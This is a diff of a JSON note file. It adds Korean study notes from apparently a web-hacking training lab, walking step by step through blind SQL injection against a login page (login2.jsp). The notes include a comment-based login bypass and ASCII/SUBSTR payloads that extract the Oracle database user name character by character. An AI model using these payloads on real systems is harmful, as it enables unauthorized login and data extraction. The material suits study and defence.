@@ -12,8 +12,8 @@
   "status": "published",
   "trashedAt": null,
   "publishedAt": "2026-11-02T07:14:08.726Z",
-  "updatedAt": "2026-11-03T00:06:14.921Z",
-  "sourceDigest": "0a29d28f4ae449ea87eb4cc35f6f58b56239e5d29582a713aaa81ebf5c9e74d7",
+  "updatedAt": "2026-11-03T01:25:34.831Z",
+  "sourceDigest": "3d09131691785f31925ae702b02a713769dee8ee11439f54d326f822e39249a3",
   "assets": [
     {
       "id": "ab62e6ff-839b-4d70-b470-cebcbc04e60f",
@@ -210,6 +210,83 @@
       "type": "image/png",
       "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/8c4cb01f-165b-43b4-a90d-69a46b83f8b7.png",
       "sha": "3f1fd652e12560bc7a9fccc30f309536dacae214"
+    },
+    {
+      "id": "35c04c71-c09d-4204-8724-1393fb8797ca",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/35c04c71-c09d-4204-8724-1393fb8797ca.png",
+      "sha": "d9bf60f33a25a45366bbfa8ff8aa3b54219cff7a"
+    },
+    {
+      "id": "366be990-5c05-47b5-ad34-bd86e0477e03",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/366be990-5c05-47b5-ad34-bd86e0477e03.png",
+      "sha": "43256b1f8827b7a7336e140468af87171b2caf36"
+    },
+    {
+      "id": "3f18113d-c877-48be-9671-24b9fa84801e",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/3f18113d-c877-48be-9671-24b9fa84801e.png",
+      "sha": "61f29c82b1970c8418629ef75ac5cf180f3226ad"
+    },
+    {
+      "id": "74df84fe-ea11-4990-9402-0040e0a7d6a3",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/74df84fe-ea11-4990-9402-0040e0a7d6a3.png",
+      "sha": "8b9e97a2494838ed521e01eb4184c1403e046a72"
+    },
+    {
+      "id": "cbf4c27c-2466-4d34-8bca-4e4bd810f959",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/cbf4c27c-2466-4d34-8bca-4e4bd810f959.png",
+      "sha": "b06869e07265bf78123fab1845e9428e430e12a5"
+    },
+    {
+      "id": "4aefcf8a-746c-43b1-aaaf-bc2c5a88e71c",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/4aefcf8a-746c-43b1-aaaf-bc2c5a88e71c.png",
+      "sha": "469a94def77a4bef52d6cc3c12b1563ace54817c"
+    },
+    {
+      "id": "00d70b27-0fd3-4cac-a214-c536ebb82fc9",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/00d70b27-0fd3-4cac-a214-c536ebb82fc9.png",
+      "sha": "99823e908f1370933bab09c962ac558ff7cb21ef"
+    },
+    {
+      "id": "4db8b17f-a78f-4089-b515-fb824674ad54",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/4db8b17f-a78f-4089-b515-fb824674ad54.png",
+      "sha": "580ca3a69ac17e07ecd933d9bbce25890df180c5"
+    },
+    {
+      "id": "75e7ee15-b41a-46bb-900d-f2a6a559de5d",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/75e7ee15-b41a-46bb-900d-f2a6a559de5d.png",
+      "sha": "9ddc97302b32eb8fd9c24534b64ec03a233ea819"
+    },
+    {
+      "id": "fd48129e-31a0-4de6-ad7a-3335e7a533b9",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/fd48129e-31a0-4de6-ad7a-3335e7a533b9.png",
+      "sha": "1ce88bb43f99fe52dd1ce2d24385819f0afcb8b2"
+    },
+    {
+      "id": "908ee142-8a14-4670-8f00-d6573ad8be35",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/908ee142-8a14-4670-8f00-d6573ad8be35.png",
+      "sha": "4e6ab4116a1dc07f6cd7be5128998d7dfdec7a3e"
     }
   ],
   "doc": {
@@ -7687,13 +7764,506 @@
         "type": "horizontalRule"
       },
       {
-        "type": "paragraph",
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
         "content": [
           {
             "type": "text",
             "text": "2일차 "
           }
         ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://pentestmonkey.net/",
+                  "target": "_blank",
+                  "rel": "noopener noreferrer",
+                  "class": null,
+                  "title": null
+                }
+              }
+            ],
+            "text": "https://pentestmonkey.net/"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "db 유저명 펜테스트 몽키에 있음 login2.jsp에서 해야함"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "was에서 하냐 db까지 처리하냐 이거 파악하고 시작"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "서버측 쿼리를 예측해라"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "참 거짓 확인"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "실습"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "'싱글 쿼터에 에러가 발생 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "sql 예측"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "case1 =SELECT * FROM MEMBER WHERE ID='파라미터ID' AND PW='파라미터PW'<- x"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "일단 id = 1' or 1=1, 1' and 1=1  sql 에러 <- id 값이 where절로 바로 들어가는 건 아닌듯함 그리고 1' -- 로 id 입력시에 로그인됨 id를 was에서 검증하는 건 아"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "was: if : pw=pw"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "select pw"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "from member"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "where id = ?"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": " "
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/35c04c71-c09d-4204-8724-1393fb8797ca.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "35c04c71-c09d-4204-8724-1393fb8797ca"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "실패"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/366be990-5c05-47b5-ad34-bd86e0477e03.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "366be990-5c05-47b5-ad34-bd86e0477e03"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "성공"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이제 db user이름을 blindsql로 하나씩 찾아보자 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "1' and (SELECT LENGTH(USER) FROM dual) = ?-- 로 user이름 길이 파악 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "1' and substr((SELECT user FROM dual),1,1) = ?-- 가 통과하면 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "길이검사"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "1' and (SELECT LENGTH(USER) FROM dual) =7-- "
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/3f18113d-c877-48be-9671-24b9fa84801e.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "3f18113d-c877-48be-9671-24b9fa84801e"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "첫번째 글자 73 I"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/74df84fe-ea11-4990-9402-0040e0a7d6a3.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "74df84fe-ea11-4990-9402-0040e0a7d6a3"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "두번째 N"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "id=1' and ASCII(SUBSTR((SELECT user FROM dual),2,1)) =78-- &passwd=1"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/cbf4c27c-2466-4d34-8bca-4e4bd810f959.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "cbf4c27c-2466-4d34-8bca-4e4bd810f959"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "세 번째 F"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "id=1' and ASCII(SUBSTR((SELECT user FROM dual),3,1)) =70-- &passwd=1"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/4aefcf8a-746c-43b1-aaaf-bc2c5a88e71c.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "4aefcf8a-746c-43b1-aaaf-bc2c5a88e71c"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "네 번째 O"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "id=1' and ASCII(SUBSTR((SELECT user FROM dual),4,1)) =79-- &passwd=1"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/00d70b27-0fd3-4cac-a214-c536ebb82fc9.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "00d70b27-0fd3-4cac-a214-c536ebb82fc9"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "다섯번째 S"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "id=1' and ASCII(SUBSTR((SELECT user FROM dual),5,1)) =83-- &passwd=1"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/4db8b17f-a78f-4089-b515-fb824674ad54.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "4db8b17f-a78f-4089-b515-fb824674ad54"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "6번째 E"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "id=1' and ASCII(SUBSTR((SELECT user FROM dual),6,1)) =69-- &passwd=1"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/75e7ee15-b41a-46bb-900d-f2a6a559de5d.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "75e7ee15-b41a-46bb-900d-f2a6a559de5d"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "7번째 C"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "id=1' and ASCII(SUBSTR((SELECT user FROM dual),7,1)) =67-- &passwd=1"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/fd48129e-31a0-4de6-ad7a-3335e7a533b9.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "fd48129e-31a0-4de6-ad7a-3335e7a533b9"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "전체 글자로 합치면"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "id=1' and (SELECT user FROM dual) ='INFOSEC'-- &passwd=1"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "INFOSEC"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/dcd21fcf-0221-47da-b0ad-81538d3a7ad1/908ee142-8a14-4670-8f00-d6573ad8be35.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "908ee142-8a14-4670-8f00-d6573ad8be35"
+        }
       },
       {
         "type": "paragraph"
